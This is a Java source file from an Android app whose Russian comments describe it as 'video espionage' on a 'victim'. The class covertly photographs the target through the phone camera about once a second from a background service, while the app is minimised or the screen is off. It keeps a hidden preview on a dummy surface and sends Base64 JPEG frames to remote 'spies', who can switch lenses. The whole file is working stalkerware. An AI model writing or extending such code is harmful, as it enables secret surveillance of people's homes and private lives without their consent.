package ru.signaly.terminal;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Size;
import android.view.Surface;

import androidx.core.content.ContextCompat;

import java.nio.ByteBuffer;
import java.util.Arrays;

import ru.signaly.net.SgB64;
import ru.signaly.net.SgVoiceCore;

/** П26 (06, 156): видео-шпионаж — камера жертвы из службы. Пока приложение жертвы на экране, кадры шлёт страница
 *  (видео, getUserMedia); свёрнуто или экран погашен — служба снимает фото раз в 1 с (Camera2: поток превью в никуда,
 *  чтобы держалась экспозиция, и снимок JPEG ~320×240). Android не дал камеру (нет права, тип службы «камера» не
 *  разрешён из фона, камера занята) — шпионам «none» («камера цели недоступна»), повтор через 10 с.
 *  Страница может попросить снимки и на экране (видео не пошло) — want(true). */
final class SgCam {
  private SgCam() { }

  static Context app;
  static HandlerThread th;
  static Handler h;
  static CameraDevice dev;
  static CameraCaptureSession ses;
  static ImageReader jpeg;
  static SurfaceTexture dummyTex;
  static Surface dummy;
  static volatile boolean open, opening, pageAsks;
  static volatile String state = "";        // photo / none — что видит шпион
  static long failAt, shotAt, noneAt;

  static void init(Context c) { app = c.getApplicationContext(); }

  /** Страница просит снимки службой, пока она на экране (видео не идёт). */
  static void want(boolean on) { pageAsks = on; }

  /** Раз в секунду (из службы): нужно ли снимать и снять. */
  static void tick() {
    SgVoiceCore core = SgVoice.core;
    boolean need = core != null && !core.spyVideo().isEmpty() && (pageAsks || !(SgNetService.foreground && SgVoice.screenOk));
    if (!need) { if (open || opening) close(); state = ""; return; }
    long t = System.currentTimeMillis();
    boolean front = core.spyVidFront();
    if ((open || opening) && front != lensFront) { close(); failAt = 0; }   // П27 (06, 159): шпион переключил камеру
    if (!open) {
      if (!opening && t - failAt >= 10000) openCam(front);
      else if ("none".equals(state) && t - noneAt >= 3000) { noneAt = t; core.spyFrame("none", null); }   // и тем, кто подключился позже
      return;
    }
    if (t - shotAt < 900) return;
    shotAt = t;
    try {
      CaptureRequest.Builder b = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
      b.addTarget(jpeg.getSurface());
      b.set(CaptureRequest.JPEG_QUALITY, (byte) 55);
      b.set(CaptureRequest.JPEG_ORIENTATION, orientation);
      ses.capture(b.build(), null, h);
    } catch (Exception e) { fail(); }
  }

  static int orientation;
  static volatile boolean lensFront = true;   // П27: какая камера открыта

  static void openCam(boolean front) {
    lensFront = front;
    if (app == null || ContextCompat.checkSelfPermission(app, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) { fail(); return; }
    try {
      CameraManager cm = (CameraManager) app.getSystemService(Context.CAMERA_SERVICE);
      if (cm == null) { fail(); return; }
      String id = null;
      for (String x : cm.getCameraIdList()) {
        Integer f = cm.getCameraCharacteristics(x).get(CameraCharacteristics.LENS_FACING);
        if (f != null && f == (front ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK)) { id = x; break; }
      }
      if (id == null && cm.getCameraIdList().length > 0) id = cm.getCameraIdList()[0];
      if (id == null) { fail(); return; }
      CameraCharacteristics cc = cm.getCameraCharacteristics(id);
      Integer so = cc.get(CameraCharacteristics.SENSOR_ORIENTATION);
      orientation = so == null ? 0 : so;
      StreamConfigurationMap map = cc.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
      Size best = new Size(640, 480);
      if (map != null) {
        Size[] all = map.getOutputSizes(ImageFormat.JPEG);
        if (all != null && all.length > 0) {
          Arrays.sort(all, (a, b) -> a.getWidth() * a.getHeight() - b.getWidth() * b.getHeight());
          best = all[all.length - 1];
          for (Size s : all) if (s.getWidth() >= 320 && s.getHeight() >= 240) { best = s; break; }   // наименьший не меньше 320×240
        }
      }
      if (th == null) { th = new HandlerThread("sg-cam"); th.start(); h = new Handler(th.getLooper()); }
      jpeg = ImageReader.newInstance(best.getWidth(), best.getHeight(), ImageFormat.JPEG, 2);
      jpeg.setOnImageAvailableListener(r -> {
        Image im = null;
        try {
          im = r.acquireLatestImage();
          if (im == null) return;
          ByteBuffer bb = im.getPlanes()[0].getBuffer();
          byte[] d = new byte[bb.remaining()];
          bb.get(d);
          state = "photo";
          SgVoiceCore core = SgVoice.core;
          if (core != null) core.spyFrame("photo", SgB64.enc(d, d.length));
        } catch (Exception ignored) { /* кадр пропал */ } finally { if (im != null) im.close(); }
      }, h);
      dummyTex = new SurfaceTexture(0);
      dummyTex.setDefaultBufferSize(320, 240);
      dummy = new Surface(dummyTex);
      opening = true;
      cm.openCamera(id, new CameraDevice.StateCallback() {
        @Override public void onOpened(CameraDevice d) {
          dev = d;
          try {
            d.createCaptureSession(Arrays.asList(dummy, jpeg.getSurface()), new CameraCaptureSession.StateCallback() {
              @Override public void onConfigured(CameraCaptureSession s) {
                ses = s;
                try {
                  CaptureRequest.Builder p = d.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                  p.addTarget(dummy);
                  s.setRepeatingRequest(p.build(), null, h);   // экспозиция и фокус подстраиваются, кадры — в никуда
                  open = true; opening = false;
                } catch (Exception e) { fail(); }
              }
              @Override public void onConfigureFailed(CameraCaptureSession s) { fail(); }
            }, h);
          } catch (Exception e) { fail(); }
        }
        @Override public void onDisconnected(CameraDevice d) { fail(); }
        @Override public void onError(CameraDevice d, int e) { fail(); }
      }, h);
    } catch (Exception e) { fail(); }
  }

  /** Камера недоступна: закрыть, шпионам — «none», повтор через 10 с. */
  static void fail() {
    close();
    failAt = System.currentTimeMillis();
    state = "none";
    SgVoiceCore core = SgVoice.core;
    if (core != null) core.spyFrame("none", null);
  }

  static void close() {
    open = false; opening = false;
    try { if (ses != null) ses.close(); } catch (Exception ignored) { /* уже */ }
    try { if (dev != null) dev.close(); } catch (Exception ignored) { /* уже */ }
    try { if (jpeg != null) jpeg.close(); } catch (Exception ignored) { /* уже */ }
    try { if (dummy != null) dummy.release(); if (dummyTex != null) dummyTex.release(); } catch (Exception ignored) { /* уже */ }
    ses = null; dev = null; jpeg = null; dummy = null; dummyTex = null;
  }
}
